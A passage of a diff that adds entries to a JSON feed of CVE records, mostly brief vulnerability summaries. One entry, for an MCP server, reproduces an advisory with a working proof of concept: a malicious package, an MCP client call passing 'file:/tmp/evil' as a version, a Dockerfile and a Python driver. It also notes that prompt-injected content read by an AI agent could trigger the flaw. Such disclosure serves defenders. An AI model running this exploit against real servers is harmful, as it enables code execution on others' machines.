+      "published": "2026-09-18",
+      "modified": "2026-09-18",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-86800",
+        "https://wpscan.com/vulnerability/01772455-89fe-4bcd-b3b7-c29b8646679d"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2024-27123",
+      "summary": "A cross-site scripting (XSS) vulnerability has been reported to affect QcalAgent. The local attackers can then exploit the vulnerability to bypass security mechanisms or read application data.\n\nWe have already fixed the vulnerability in the following version:\nQcalAgent 1.1.9 and later",
+      "cvssScore": null,
+      "severity": "Medium",
+      "published": "2026-09-18",
+      "modified": "2026-09-18",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2024-27123",
+        "https://www.qnap.com/en/security-advisory/qsa-24-54"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-19387",
+      "summary": "A heap out-of-bounds write vulnerability was found in the GStreamer gst-plugins-bad adpcmdec element when decoding IMA/DVI ADPCM audio. Insufficient validation of the per-block sample count for multi-channel streams allows a crafted WAV file to cause writes beyond the allocated output buffer. This can lead to application crash, denial of service, memory corruption, or potentially arbitrary code execution when untrusted media is processed.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-08-10",
+      "modified": "2026-09-18",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-19387",
+        "https://access.redhat.com/errata/RHSA-2026:55433",
+        "https://access.redhat.com/errata/RHSA-2026:55865",
+        "https://access.redhat.com/errata/RHSA-2026:56521",
+        "https://access.redhat.com/errata/RHSA-2026:65122"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0843",
+      "summary": "Buffer overflows in the ApacheBench benchmark support program (ab.c) in Apache before 1.3.27, and Apache 2.x before 2.0.43, allow a malicious web server to cause a denial of service and possibly execute arbitrary code via a long response.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2004-09-02",
+      "published": "2002-10-11",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=109416709710447&w=2",
-        "http://secunia.com/advisories/12458",
-        "http://www.securityfocus.com/bid/11095",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/17217",
-        "http://marc.info/?l=bugtraq&m=109416709710447&w=2"
+        "ftp://patches.sgi.com/support/free/security/advisories/20021105-01-I",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0229.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0254.html",
+        "http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000530",
+        "http://distro.conectiva.com/atualizacoes/?id=a&anuncio=000530"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-16750",
+      "summary": "The Motors – Car Dealership & Classified Listings Plugin plugin for WordPress is vulnerable to unauthorized access of data due to missing authorization checks in mvl_ajax_dealer_load_cars() function in all versions up to, and including, 1.4.120. This makes it possible for unauthenticated attackers to retrieve draft, pending, private, and future car listings belonging to arbitrary users.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-09-18",
+      "modified": "2026-09-18",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-16750",
+        "https://plugins.trac.wordpress.org/changeset/3684170",
+        "https://www.wordfence.com/threat-intel/vulnerabilities/id/38d01b12-97ac-412b-b9df-c27118ce8f50?source=cve"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0645",
+      "summary": "SQL injection vulnerability in stored procedures for Microsoft SQL Server 2000 and Microsoft Desktop Engine (MSDE) 2000 may allow authenticated users to execute arbitrary commands.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-08-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-038",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-038"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-59177",
+      "summary": "## Summary\n\nOn the Home Assistant add-on, the dashboard serves a trusted ingress site that skips authentication because the supervisor authenticates the request upstream. That site was binding `0.0.0.0`. The add-on runs in host network mode for mDNS, so binding all interfaces also bound the host's LAN interface, and any device on the local network could reach `http://<ha-ip>:<ingress_port>/` and get the full dashboard with no credentials.\n\n## Details\n\nThe HA add-on ingress site is intentionally unauthenticated: the supervisor's ingress proxy authenticates the browser upstream, and the dashboard's threat model assumes the site is reachable only through the supervisor's docker network. The protection depended on physically binding the site to the supervisor, but the site bound `0.0.0.0` instead. Because the add-on uses host networking, `0.0.0.0` includes the host's LAN address, so the no-auth site was reachable directly from the LAN, bypassing the supervisor and its authentication entirely.\n\nThis is an auth bypass on a boundary the dashboard explicitly defends. `docs/THREAT_MODEL.md` names, under the surface it still defends, \"anything that lets external traffic reach the ingress site without going through the supervisor.\" The bug is exactly that.\n\nThe fix, in PR #1565, mirrors what the legacy add-on's nginx did:\n\n- Bind the ingress site to loopback plus the supervisor gateway (`127.0.0.1` and `172.30.32.1`) instead of all interfaces. Loopback serves HA core's host-network ESPHome integration, which connects to `127.0.0.1:<ingress_port>` without credentials by design; the gateway serves the supervisor's ingress proxy. The LAN interface is no longer bound; an explicit `--ingress-host` still overrides the bind.\n- Add `ingress_peer_guard`, which returns 403 to any TCP peer other than loopback or the supervisor (`172.30.32.2`), so another hassio bridge add-on reaching the gateway cannot use the site either. This mirrors the legacy nginx `allow 127.0.0.1; allow 172.30.32.2; deny all`.\n\nThe password-gated public port (6052) is not affected; this only affects the host-network HA add-on's ingress port.\n\n## Impact\n\nAny device on the same local network as the Home Assistant host could open the dashboard with no credentials and gain its full authenticated capability. Per `docs/THREAT_MODEL.md`, that capability is host equivalent: an authenticated caller can run arbitrary Python at compile time via `external_components:`, run arbitrary shell through the compile and validation subprocesses, and read or write arbitrary files in the config and data directories. So the practical impact is full compromise of the add-on, including the Home Assistant config directory it mounts and the ESPHome devices it manages.\n\nThe exposure was present by default on every host-network HA add-on install; no operator misconfiguration was required. The standalone Docker dashboard and the password-gated public port are not affected.\n\n## Severity rationale\n\nAn unauthenticated network client reaches a dashboard site that performs no authentication of its own, and a client that reaches the dashboard has host equivalent capability. ESPHome's [threat model](https://github.com/esphome/device-builder/blob/main/docs/THREAT_MODEL.md) documents that a dashboard caller can run arbitrary code at compile time and read or write files in the config and data directories, so confidentiality, integrity, and availability are all High, with no credentials, no user interaction, and low attack complexity. The exposed surface is the Home Assistant host's local network interface rather than the internet, so the attack vector is adjacent, giving a CVSS base score of 8.8.\n\nThe rating is anchored at the worst case because the exposure was present by default on every host-network HA add-on install, the dominant deployment, and required nothing of the victim. Any party able to reach the host's local network, including a guest network that is not isolated, an untrusted IoT device, or a compromised local host, obtains full control with a single unauthenticated request.\n\nOperational risk is lower for installations on a single trusted home or business network behind a firewall, since reaching the dashboard there requires an attacker who is already inside that network, and ESPHome is [designed for deployment on trusted networks](https://esphome.io/guides/security_best_practices/) with the network perimeter as the primary defense. That deployment context reduces real world exposure; it does not change the base severity. The ingress site is intended to require the supervisor's authentication even on the local network, and the fix restores that.\n\n## Patches\n\nFixed in device-builder 1.0.10 (PR #1565). The ingress site is bound to loopback and the supervisor gateway only, and a peer guard rejects any TCP peer other than loopback or the supervisor regardless of `--ingress-host`. The esphome container delivers the fix by bundling device-builder 1.0.10 or newer.\n\n## Workarounds\n\nUpgrade to 1.0.10 or newer (an esphome container bundling device-builder 1.0.10+). Without upgrading, restrict access to the add-on's ingress port at the network layer, for example a host or router firewall rule that allows only the Home Assistant host and the supervisor to reach it, and keep the Home Assistant host on a trusted LAN segment. Accessing the dashboard through Home Assistant's normal ingress URL is unaffected and stays authenticated.\n\n## Resources\n\n- Fix: esphome/device-builder#1565\n- Ingress site introduction: esphome/device-builder#25\n- Originating investigation: esphome/device-builder#1560\n- ESPHome security best practices: https://esphome.io/guides/security_best_practices/",
+      "cvssScore": 8.8,
+      "severity": "High",
+      "published": "2026-09-09",
+      "modified": "2026-09-09",
+      "cwe": {
+        "cwe_id": "CWE-1327",
+        "name": "Binding to an Unrestricted IP Address"
+      },
+      "references": [
+        "https://github.com/esphome/device-builder/security/advisories/GHSA-vv4j-m4vr-f3g6",
+        "https://github.com/esphome/device-builder/pull/1565",
+        "https://github.com/esphome/device-builder/commit/b6387db3f8bf1d3df5771f40e9856b959ae4f6a1",
+        "https://github.com/advisories/GHSA-vv4j-m4vr-f3g6"
+      ],
+      "vulnerableProducts": [
+        "esphome-device-builder pip"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-59176",
+      "summary": "## MCP `set_functype_version` Package Alias RCE via Unsanitized pnpm install + Dynamic Import\n\n### Summary\n\nThe `set_functype_version` MCP tool in `functype-mcp-server` accepts an unconstrained `version` string, interpolates it directly into an npm package specifier (`functype@<version>`), and installs it via `pnpm add` without any validation. Because npm/pnpm package specifiers support `file:`, `npm:`, and other alias syntaxes, an attacker who can send an MCP `tools/call` request to this tool can cause the server to install an arbitrary local or remote package as `functype`. Immediately after installation, the server calls `initDocsData(true)`, which dynamically imports `functype/cli` from the newly installed location, executing attacker-controlled JavaScript in the MCP server process. This results in full Remote Code Execution (RCE) with the privileges of the server process — full confidentiality, integrity, and availability impact (CVSS 7.8 High).\n\n### Details\n\nThe vulnerable code is in `packages/mcp-server/src/index.ts`. The `set_functype_version` tool is registered at line 115 and is enabled by default (no authentication required in stdio mode).\n\n**Source (user input accepted without validation):**\n```ts\n// packages/mcp-server/src/index.ts:119-121\nparameters: z.object({\n  version: z.string().describe('The functype version to install (e.g., \"0.46.0\", \"latest\", \"^0.45.0\")'),\n}),\n```\nOnly `z.string()` validation is applied — no semver format check, no allowlist for dist-tags, and no rejection of `file:`, `npm:`, URL, or path alias syntaxes.\n\n**Sink 1 — arbitrary package installation:**\n```ts\n// packages/mcp-server/src/index.ts:122-125\nexecute: async (args) => {\n  const spec = `functype@${args.version}`\n  try {\n    execFileSync(\"pnpm\", [\"add\", spec], { cwd: PROJECT_ROOT, stdio: \"pipe\", timeout: 60_000 })\n```\n`args.version` is interpolated into the package specifier string and passed directly to `pnpm add`. Supplying `file:/path/to/evil` causes pnpm to install an attacker-controlled directory as the `functype` package alias.\n\n**Sink 2 — dynamic import executes installed package code:**\n```ts\n// packages/mcp-server/src/lib/docs/data.ts:23-30\nif (force) {\n  const resolvedPath = require.resolve(\"functype/cli\")\n  cli = await import(`${pathToFileURL(resolvedPath).href}?t=${Date.now()}`)\n}\n```\n`initDocsData(true)` is called immediately after installation (line 134 in `index.ts`). It resolves `functype/cli` from the node_modules that now points to the attacker's package and dynamically imports it, executing any module-level code in the attacker's `cli.js` at import time.\n\n**Data flow summary:**\n1. `index.ts:115` — MCP tool `set_functype_version` registered, no auth required.\n2. `index.ts:119-121` — `version` accepted as raw `z.string()` (source).\n3. `index.ts:123` — `functype@${args.version}` constructed without sanitization.\n4. `index.ts:125` — `execFileSync(\"pnpm\", [\"add\", spec], ...)` installs attacker-controlled package (sink: arbitrary install).\n5. `index.ts:134` — `initDocsData(true)` called immediately.\n6. `data.ts:29-30` — `require.resolve(\"functype/cli\")` + dynamic `import()` executes attacker module (sink: RCE).\n\n### PoC\n\n**Step 1 — Prepare the attacker-controlled evil package:**\n```bash\nmkdir -p /tmp/evil\ncat > /tmp/evil/package.json <<'EOF'\n{\"name\":\"evil-functype\",\"version\":\"1.0.0\",\"type\":\"module\",\"exports\":{\"./cli\":\"./cli.js\"}}\nEOF\ncat > /tmp/evil/cli.js <<'EOF'\nimport { writeFileSync } from \"node:fs\";\nwriteFileSync(\"/pwned.txt\", \"RCE: mcp import-time code execution via set_functype_version\\n\");\nexport const TYPES = {};\nexport const INTERFACES = {};\nexport const CATEGORIES = {};\nexport const FULL_INTERFACES = {};\nexport const VERSION = \"1.0.0\";\nEOF\n```\n\n**Step 2 — Clone and build the victim monorepo at the affected version:**\n```bash\nTMP=\"$(mktemp -d)\"\ngit clone https://github.com/jordanburke/functype.git \"$TMP/functype\"\ncd \"$TMP/functype\"\ngit checkout v1.4.3\ncorepack enable\npnpm install --frozen-lockfile\npnpm -F functype build\npnpm -F functype-mcp-server build\n```\n\n**Step 3 — Set up an MCP client to deliver the exploit:**\n```bash\ncd \"$TMP\"\nnpm init -y\nnpm pkg set type=module\nnpm install @modelcontextprotocol/sdk\n\ncat > exploit.mjs <<'EOF'\nimport { Client } from \"@modelcontextprotocol/sdk/client/index.js\";\nimport { StdioClientTransport } from \"@modelcontextprotocol/sdk/client/stdio.js\";\n\nconst client = new Client({ name: \"poc\", version: \"1.0.0\" });\nconst transport = new StdioClientTransport({\n  command: \"node\",\n  args: [`${process.env.REPO}/packages/mcp-server/dist/bin.js`],\n  env: { ...process.env, TRANSPORT_TYPE: \"stdio\" },\n});\n\nawait client.connect(transport);\nconst result = await client.callTool({\n  name: \"set_functype_version\",\n  arguments: { version: \"file:/tmp/evil\" },\n});\nconsole.log(result);\nawait client.close();\nEOF\n\nREPO=\"$TMP/functype\" node exploit.mjs\n```\n\n**Step 4 — Verify arbitrary code execution:**\n```bash\ncat /pwned.txt\n# Expected output: RCE: mcp import-time code execution via set_functype_version\n```\n\n**Dynamic reproduction (Docker):**\n\nThe Phase 2 dynamic test used the provided Dockerfile which automates the above steps inside a container. The container confirmed creation of `/pwned.txt` with the expected payload string, proving end-to-end RCE.\n\n```\n[poc] EXPLOIT SUCCEEDED: /pwned.txt exists\n[poc] File contents: RCE: mcp import-time code execution via set_functype_version\n[evil-payload] Arbitrary code executed via functype/cli dynamic import\n```\n\n**Recommended remediation:**\n```diff\n+const SAFE_FUNCTYPE_VERSION = /^(?:latest|next|beta|alpha|canary|rc|[~^]?v?\\d+(?:\\.\\d+){0,2}(?:-[0-9A-Za-z.-]+)?(?:\\+[0-9A-Za-z.-]+)?)$/\n+\n+const isSafeFunctypeVersion = (version: string): boolean => {\n+  const trimmed = version.trim()\n+  return trimmed === version && SAFE_FUNCTYPE_VERSION.test(trimmed) && !/[/:\\\\@]/.test(trimmed)\n+}\n\n execute: async (args) => {\n-  const spec = `functype@${args.version}`\n+  if (!isSafeFunctypeVersion(args.version)) {\n+    return \"Invalid functype version. Use a semver version, range prefix (^ or ~), or a known dist-tag.\"\n+  }\n+  const spec = `functype@${args.version}`\n   try {\n-    execFileSync(\"pnpm\", [\"add\", spec], { cwd: PROJECT_ROOT, stdio: \"pipe\", timeout: 60_000 })\n+    execFileSync(\"pnpm\", [\"add\", \"--ignore-scripts\", spec], { cwd: PROJECT_ROOT, stdio: \"pipe\", timeout: 60_000 })\n```\n\n### Impact\n\nThis is a **Remote Code Execution (RCE)** vulnerability. Any MCP client that can invoke the `set_functype_version` tool — which requires no authentication and is enabled by default in the stdio MCP server — can execute arbitrary JavaScript in the MCP server process.\n\n**Who is impacted:**\n- Developers and teams running `functype-mcp-server` (version 1.4.3) in their local or CI environments as an AI coding assistant integration.\n- Users whose AI assistant (LLM agent) is connected to this MCP server and is susceptible to indirect prompt injection: a malicious document or web page read by the AI could trigger a `set_functype_version` call with a `file:` or `npm:` alias payload.\n- In non-default `TRANSPORT_TYPE=httpStream` deployments, network-accessible attackers can exploit this without local access.\n\nThe full impact at exploitation is confidentiality, integrity, and availability — an attacker can read secrets from the process environment, modify files, or crash the server.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\n# Dockerfile for VULN-001: MCP set_functype_version Package Alias RCE\n#\n# Build context: reports/npmAI_684_jordanburke__functype/\n#   COPY repo/       -> /workspace/functype/   (victim monorepo)\n#   COPY vuln-001/   -> supporting PoC files\n#\n# Build:  docker build -t vuln001-functype-rce -f vuln-001/Dockerfile .\n# Run:    docker run --rm vuln001-functype-rce\n#\n# Expected exit 0 with \"[poc] EXPLOIT SUCCEEDED\" in output.\n\nFROM node:24-slim\n\n# Install pnpm matching the repo's packageManager field (pnpm@11.7.0).\nRUN npm install -g pnpm@11.7.0 --quiet\n\n# ── Victim workspace ────���─────────────────────────────────────────────────────\nWORKDIR /workspace/functype\nCOPY repo/ ./\n\n# Install all workspace deps. --no-frozen-lockfile avoids hash mismatches\n# caused by running on a different pnpm minor than the one that generated the\n# lockfile; the installed versions are still constrained by the lockfile\n# specifiers for the packages we care about.\nRUN pnpm install --no-frozen-lockfile\n\n# Build functype first (mcp-server externals functype at build time).\nRUN pnpm -F functype build\n\n# Build the MCP server binary (output: packages/mcp-server/dist/bin.js).\nRUN pnpm -F functype-mcp-server build\n\n# ── Attacker-controlled evil package ─────────────────────────────────────────\n# /evil/cli.js writes /pwned.txt when dynamically imported.\nCOPY vuln-001/evil/ /evil/\n\n# ── MCP exploit client ────────────────────────────────────────────────────────\nWORKDIR /client\nRUN npm init -y --quiet && \\\n    npm pkg set type=module && \\\n    npm install @modelcontextprotocol/sdk@1.29.0 --quiet\nCOPY vuln-001/client/exploit.mjs ./exploit.mjs\n\n# Default entrypoint: run the exploit and exit 0 on success.\nCMD [\"node\", \"/client/exploit.mjs\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC driver for VULN-001: MCP set_functype_version Package Alias RCE\nvia Unsanitized pnpm install + Dynamic Import (CWE-829, CVSS 7.8 High).\n\nAttack chain:\n  1. Attacker calls MCP tool set_functype_version with version=\"file:/evil\"\n  2. Server executes: execFileSync(\"pnpm\", [\"add\", \"functype@file:/evil\"], ...)\n  3. Evil package is installed as the functype alias in mcp-server's node_modules\n  4. Server calls initDocsData(true) which resolves functype/cli and dynamic-imports it\n  5. /evil/cli.js runs at import time -> writes /pwned.txt (arbitrary code execution)\n\nUsage:\n  python3 poc.py [--build-only]\n\nRequirements:\n  - Docker daemon running\n  - Build context at parent directory of this file's directory\n\"\"\"\n\nimport subprocess\nimport sys\nimport json\nimport os\nimport argparse\n\nVULN_DIR = os.path.dirname(os.path.abspath(__file__))\nREPORT_DIR = os.path.dirname(VULN_DIR)\nIMAGE_NAME = \"vuln001-functype-rce\"\nDOCKERFILE = os.path.join(VULN_DIR, \"Dockerfile\")\nRESULT_FILE = os.path.join(VULN_DIR, \"phase2_result.json\")\n\nBUILD_CMD = [\"docker\", \"build\", \"-t\", IMAGE_NAME, \"-f\", DOCKERFILE, REPORT_DIR]\nRUN_CMD = [\"docker\", \"run\", \"--rm\", IMAGE_NAME]\n\ndef run(cmd, timeout=None, **kwargs):\n    \"\"\"Run a command and return CompletedProcess with combined output.\"\"\"\n    return subprocess.run(\n        cmd,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True,\n        timeout=timeout,\n        **kwargs,\n    )\n\ndef write_result(passed, verdict, reason, evidence):\n    result = {\n        \"passed\": passed,\n        \"verdict\": verdict,\n        \"reason\": reason,\n        \"build_command\": \" \".join(BUILD_CMD),\n        \"run_command\": \" \".join(RUN_CMD),\n        \"poc_command\": f\"python3 {os.path.basename(__file__)}\",\n        \"evidence\": evidence,\n        \"artifacts\": [\"Dockerfile\", \"poc.py\", \"evil/package.json\", \"evil/cli.js\", \"client/exploit.mjs\"],\n    }\n    with open(RESULT_FILE, \"w\", encoding=\"utf-8\") as f:\n        json.dump(result, f, indent=2, ensure_ascii=False)\n    print(f\"[poc] Result written to {RESULT_FILE}\")\n    print(f\"[poc] verdict={verdict}  passed={passed}\")\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"VULN-001 PoC driver\")\n    parser.add_argument(\"--build-only\", action=\"store_true\", help=\"Only build the image, do not run\")\n    args = parser.parse_args()\n\n    # ── Build ───────────────────��─────────────────────────────────────────────\n    print(\"[poc] Building Docker image (this may take a few minutes)...\")\n    print(f\"[poc] Build command: {' '.join(BUILD_CMD)}\")\n\n    try:\n        build = run(BUILD_CMD, timeout=900)\n    except subprocess.TimeoutExpired:\n        msg = \"Docker build timed out after 900 seconds\"\n        print(f\"[poc] ERROR: {msg}\")\n        write_result(False, \"INCOMPLETE\", f\"빌드 타임아웃: {msg}\", msg)\n        sys.exit(2)\n\n    if build.returncode != 0:\n        tail = (build.stdout + \"\\n\" + build.stderr)[-3000:]\n        print(\"[poc] Build FAILED:\")\n        print(tail)\n        write_result(\n            False,\n            \"FAIL\",\n            \"Docker 이미지 빌드 실패. pnpm install 또는 TypeScript 빌드 오류 확인 필요.\",\n            f\"BUILD EXIT {build.returncode}\\n{tail}\",\n        )\n        sys.exit(1)\n\n    print(\"[poc] Build succeeded.\")\n\n    if args.build_only:\n        print(\"[poc] --build-only flag set; skipping run.\")\n        sys.exit(0)\n\n    # ── Run ──────────────────────────────────────────────────────────────────��\n    print(f\"[poc] Running exploit container: {' '.join(RUN_CMD)}\")\n\n    try:\n        run_result = run(RUN_CMD, timeout=180)\n    except subprocess.TimeoutExpired:\n        msg = \"Container run timed out after 180 seconds\"\n        print(f\"[poc] ERROR: {msg}\")\n        write_result(False, \"INCOMPLETE\", f\"컨테이너 실행 타임아웃: {msg}\", msg)\n        sys.exit(2)\n\n    stdout = run_result.stdout or \"\"\n    stderr = run_result.stderr or \"\"\n    combined = stdout + \"\\n\" + stderr\n\n    print(\"=\" * 60)\n    print(\"STDOUT:\")\n    print(stdout)\n    print(\"STDERR:\")\n    print(stderr)\n    print(f\"EXIT CODE: {run_result.returncode}\")\n    print(\"=\" * 60)\n\n    # Success criteria: exit 0 AND exploit succeeded message present\n    exploit_succeeded = \"EXPLOIT SUCCEEDED\" in combined\n    passed = run_result.returncode == 0 and exploit_succeeded\n\n    if passed:\n        # Extract key evidence lines\n        evidence_lines = [\n            line for line in combined.splitlines()\n            if any(kw in line for kw in (\"EXPLOIT SUCCEEDED\", \"pwned.txt\", \"evil-payload\", \"RCE:\"))\n        ]\n        evidence = \"\\n\".join(evidence_lines) if evidence_lines else combined[-1000:]\n\n        write_result(\n            True,\n            \"PASS\",\n            (\n                \"컨테이너 내 /pwned.txt 생성 확인: MCP set_functype_version 도구에 \"\n                'version=\"file:/evil\" 인수를 전달하자 서버가 pnpm add functype@file:/evil을 실행한 후 '\n                \"initDocsData(true)가 동적 import를 통해 evil/cli.js를 실행, 임의 파일 쓰기(RCE)가 발생함.\"\n            ),\n            evidence,\n        )\n        print(\"[poc] === PASS: exploit reproduced ===\")\n        sys.exit(0)\n\n    else:\n        # Distinguish failure modes\n        if not exploit_succeeded and run_result.returncode == 0:\n            verdict = \"INCOMPLETE\"\n            reason = (\n                \"/pwned.txt가 생성되지 않았으나 컨테이너는 정상 종료됨. \"\n                \"pnpm add 후 require.resolve 경로 확인 필요 — pnpm 가상 스토어 구조로 인해 \"\n                \"node_modules/functype 심볼릭링크가 예상 위치에 없을 수 있음.\"\n            )\n        else:\n            verdict = \"FAIL\"\n            reason = (\n                f\"컨테이너 종료 코드 {run_result.returncode}. \"\n                \"exploit.mjs 오류 또는 MCP 서버 시작 실패. 로그 확인 필요.\"\n            )\n\n        write_result(False, verdict, reason, combined[-2000:])\n        print(f\"[poc] === {verdict}: exploit did not reproduce ===\")\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    main()\n```",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2026-09-09",
+      "modified": "2026-09-09",
+      "cwe": {
+        "cwe_id": "CWE-829",
+        "name": "Inclusion of Functionality from Untrusted Control Sphere"
+      },
+      "references": [
+        "https://github.com/jordanburke/functype/security/advisories/GHSA-wcjj-9m6g-2fr2",
+        "https://github.com/jordanburke/functype/commit/c0d58ad9c2a7d15c6117bd3adbbd75de37317dcf",
+        "https://github.com/advisories/GHSA-wcjj-9m6g-2fr2"
+      ],
+      "vulnerableProducts": [
+        "functype-mcp-server npm"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-59172",
+      "summary": "## Impact\n\nIn Joker versions before 1.8.2, `joker --lint <file>` located a `.jokerd/` directory by walking up from the linted file and executed matching `linter.*` files from that directory before linting. Because these files are executable Joker/Clojure code, linting a file inside an untrusted repository could execute code supplied by that repository.\n\nThis could be triggered by editor integrations or CI jobs that automatically run `joker --lint` on checked-out source code.\n\n## Patches\n\nFixed in Joker v1.8.2. Executable linter customization files are now loaded only from the user's home `.jokerd` directory (`~/.jokerd/linter.cljc`, `~/.jokerd/linter.clj`, `~/.jokerd/linter.cljs`, or `~/.jokerd/linter.joke`). Project-local `.jokerd/linter.*` files are no longer executed.\n\n## Workarounds\n\nUsers who cannot upgrade should avoid running `joker --lint` on untrusted repositories, especially through editor integrations or unattended CI. Removing or disabling project-local `.jokerd/linter.*` files before linting also avoids the code-execution path.\n\n## Credits\n\nReported by Younghun Ko of AhnLab (@koyokr).",
+      "cvssScore": 7.8,
+      "severity": "High",
+      "published": "2026-09-09",
+      "modified": "2026-09-09",
+      "cwe": {
+        "cwe_id": "CWE-829",
+        "name": "Inclusion of Functionality from Untrusted Control Sphere"
+      },
+      "references": [
+        "https://github.com/candid82/joker/security/advisories/GHSA-m835-3cm9-rggg",
+        "https://github.com/advisories/GHSA-m835-3cm9-rggg"
+      ],
+      "vulnerableProducts": [
+        "github.com/candid82/joker go"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0658",
+      "summary": "Cross-site scripting (CSS) vulnerability in Microsoft Internet Security and Acceleration (ISA) Server 2000 allows remote attackers to cause other clients to execute certain script or read cookies via malicious script in an invalid URL that is not properly quoted in an error message.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-09-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/3198",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-045",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6991",
+        "http://www.securityfocus.com/bid/3198",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-045"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0659",
+      "summary": "Buffer overflow in IrDA driver providing infrared data exchange on Windows 2000 allows attackers who are physically close to the machine to cause a denial of service (reboot) via a malformed IrDA packet.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-09-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/209385",
+        "http://www.securityfocus.com/bid/3215",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-046",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7008",
+        "http://online.securityfocus.com/archive/1/209385"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-118747",
+      "summary": "## Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in .NET. This advisory provides guidance on updating affected applications and components.\n\nColliding CBOR map keys can hash-flood uniqueness checks; the fix uses seeded Marvin hashing.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/501\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** High\n- **Score:** 7.5 (base score)\n- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:U/RL:O/RC:C`\n- **Weakness:** CWE-407\n\n## Affected Platforms\n\n- **Platforms:** Any supported OS\n- **Architectures:** All\n\n## <a name=\"affected-packages\"></a>Affected Packages\n\nThe tables list affected package versions and fixed versions. These are independently versioned NuGet packages, not runtime patch versions.\n\n### 8.0 - standalone packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[System.Formats.Cbor](https://www.nuget.org/packages/System.Formats.Cbor) | >= 8.0.0-0, < 8.0.2 | 8.0.2\n\n### 9.0 - standalone packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[System.Formats.Cbor](https://www.nuget.org/packages/System.Formats.Cbor) | >= 9.0.0-0, < 9.0.24 | 9.0.24\n\nUpdate 9.0 applications to System.Formats.Cbor 9.0.24; 9.0.23 is not a fix. The fixed 10.0.15 package, which includes a net9.0 target, remains an alternative.\n\n### 10.0 - standalone packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[System.Formats.Cbor](https://www.nuget.org/packages/System.Formats.Cbor) | >= 10.0.0-0, < 10.0.15 | 10.0.15\n\n### 11.0 - standalone packages\n\nPackage | Affected version | Patched version\n| --- | ---\n[System.Formats.Cbor](https://www.nuget.org/packages/System.Formats.Cbor) | >= 11.0.0-0, < 11.0.0 | 11.0.0\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nCheck the application's System.Formats.Cbor package reference against the affected ranges above. Updating only the installed runtime does not update this independently referenced package.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\nUpdate each applicable package reference to its patched version listed above, then rebuild and redeploy the application. Updating only the installed runtime does not update an application's standalone package references.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue).\n\nSecurity reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, 